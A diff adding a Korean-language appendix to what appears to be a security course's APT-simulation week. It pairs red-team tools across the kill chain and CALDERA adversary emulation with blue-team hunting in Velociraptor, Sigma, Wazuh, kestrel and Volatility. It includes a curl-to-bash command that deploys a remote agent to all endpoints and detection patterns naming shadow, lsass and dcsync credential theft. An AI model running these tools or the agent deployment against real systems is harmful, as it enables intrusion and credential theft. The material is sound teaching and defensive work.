@@ -772,3 +772,161 @@ graph LR
 
 **학생 액션**: 1주 APT 시나리오 → 14 tactic 매핑.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course11 — Week 14 APT 시뮬)
+
+### Red — APT Kill Chain
+
+| Phase | 도구 |
+|------|------|
+| Initial Access | gophish (phish) / hydra (자격증명) |
+| Execution | sliver / msfvenom / pwncat-cs |
+| Persistence | cron / systemd / SSH key (week09 재사용) |
+| Privilege Escalation | LinPEAS + GTFOBins (week05 재사용) |
+| Defense Evasion | shred + chattr + LOTL |
+| Lateral Movement | impacket / chisel / sshuttle |
+| Collection | tar + base64 / age 암호화 |
+| Exfiltration | iodine (DNS tunnel) / dnscat2 |
+
+### CALDERA (MITRE adversary emulation)
+
+```bash
+# 1) CALDERA 시작 (week12 자율보안 재사용)
+git clone https://github.com/mitre/caldera --recursive ~/caldera
+cd ~/caldera && pip install -r requirements.txt
+python3 server.py --insecure                          # http://localhost:8888
+
+# 2) Adversary profile (50+ APT 내장)
+# Web UI 에서 선택:
+# - APT29 (Cozy Bear)
+# - APT41 (China)
+# - Lazarus (NK)
+# - FIN7 (Carbanak)
+
+# 3) Sandcat agent 배포 (모든 endpoint)
+curl -s -X POST -H "file:sandcat.go" -H "platform:linux" \
+    http://caldera:8888/file/download | bash
+
+# 4) Operation 시작
+# Web UI → Operations → Create
+# - Adversary: APT29
+# - Group: linux-hosts (자동 enroll 된 sandcat agent)
+# - Planner: atomic
+# → Start
+
+# 5) 다단계 자동 실행
+# Phase 1: Discovery (T1083, T1057)
+# Phase 2: Defense Evasion (T1027)
+# Phase 3: Credential Access (T1003)
+# Phase 4: Lateral Movement (T1021)
+# Phase 5: Collection (T1005)
+# Phase 6: Exfiltration (T1041)
+```
+
+### Blue — APT 탐지 (Velociraptor + Sigma + kestrel)
+
+```bash
+# === 1. Velociraptor live hunt (multi-host) ===
+velociraptor flow create EvidenceOfCompromise \
+    --client.id all \
+    --artifacts \
+        Linux.Sys.AuthorizedKeys \
+        Linux.Sys.Crontab \
+        Generic.Detection.Yara.Process \
+        Generic.System.Pstree
+
+# 결과 정기 fetch
+velociraptor downloads list
+
+# === 2. Sigma + chainsaw (다중 룰) ===
+chainsaw hunt /var/log -s ~/sigma/rules/linux/ \
+    --output json > /tmp/hunt-apt.json
+
+# Filter — APT 의심 patterns 만
+jq -r '.[] | select(.rule.tags | tostring | contains("attack.persistence"))' \
+    /tmp/hunt-apt.json | head
+
+# === 3. ATT&CK 매핑 (Wazuh) ===
+sudo jq -r 'select(.rule.mitre.id) | .rule.mitre.id' \
+    /var/ossec/logs/alerts/alerts.json | sort | uniq -c | sort -rn
+
+# 출력 예 (CALDERA APT29 op 후):
+#   8  T1083 (Discovery)
+#   5  T1027 (Obfuscated Files)
+#   3  T1003 (Credential Dump)
+#   2  T1021 (Remote Services)
+
+# === 4. Threat hunting (kestrel — 가설) ===
+cat > /tmp/apt-hunt.huntflow << 'EOF'
+# Hypothesis: APT29 — credential dump 후 lateral
+
+# 1. LSASS 또는 shadow 접근
+cred_access = GET process FROM stixshifter://wazuh
+            WHERE [process:command_line LIKE '%shadow%'
+                OR process:command_line LIKE '%lsass%'
+                OR process:command_line LIKE '%dcsync%']
+
+# 2. 1시간 내 새 outbound connection
+post_cred = GET network-traffic FROM stixshifter://wazuh
+          WHERE [network-traffic:start > {1h ago}]
+
+# 3. 결합 (cred_access 후 outbound)
+suspicious_combos = JOIN cred_access, post_cred
+                  ON cred_access.host_id = post_cred.host_id
+
+DISP suspicious_combos ATTR host_id, src_ip, dst_ip, dst_port
+EOF
+
+kestrel run /tmp/apt-hunt.huntflow
+
+# === 5. Forensic (Volatility 메모리) ===
+sudo insmod ~/lime/lime-$(uname -r).ko 'path=/forensic/mem.lime format=lime'
+vol -f /forensic/mem.lime linux.malfind                    # injected code
+vol -f /forensic/mem.lime linux.bash                       # bash history (메모리)
+vol -f /forensic/mem.lime linux.netscan                    # 활성 connection
+```
+
+### APT Cycle 자동 보고
+
+```python
+# /opt/scripts/apt_report.py
+import json
+from datetime import datetime, timedelta
+import requests
+
+# 1) ATT&CK 매핑 추출 (24h)
+with open('/var/ossec/logs/alerts/alerts.json') as f:
+    alerts = [json.loads(l) for l in f if l.strip()]
+
+mitre_techniques = {}
+for a in alerts:
+    if mitre := a.get('rule', {}).get('mitre'):
+        for tech in mitre.get('id', []):
+            mitre_techniques[tech] = mitre_techniques.get(tech, 0) + 1
+
+# 2) ATT&CK Navigator JSON 생성
+navigator_layer = {
+    "name": f"Detected ATT&CK Techniques {datetime.now().date()}",
+    "domain": "enterprise-attack",
+    "techniques": [
+        {"techniqueID": tech, "score": count}
+        for tech, count in mitre_techniques.items()
+    ]
+}
+
+with open('/tmp/attack-navigator.json', 'w') as f:
+    json.dump(navigator_layer, f)
+
+# 3) DeTT&CT 으로 coverage 측정
+# DeTT&CT 비교: Detected vs Catalog (모든 가능한 technique)
+# Coverage = Detected / Catalog * 100%
+
+# 4) 보고서
+print(f"Detected ATT&CK techniques: {len(mitre_techniques)}")
+print(f"Total alerts: {sum(mitre_techniques.values())}")
+print(f"Top 10: {sorted(mitre_techniques.items(), key=lambda x: -x[1])[:10]}")
+```
+
+학생은 본 14주차에서 **CALDERA APT 시뮬 ↔ Velociraptor + Sigma + chainsaw + kestrel + Volatility** 의 advanced 공방 + ATT&CK 매핑 자동 보고를 OSS 도구로 익힌다.
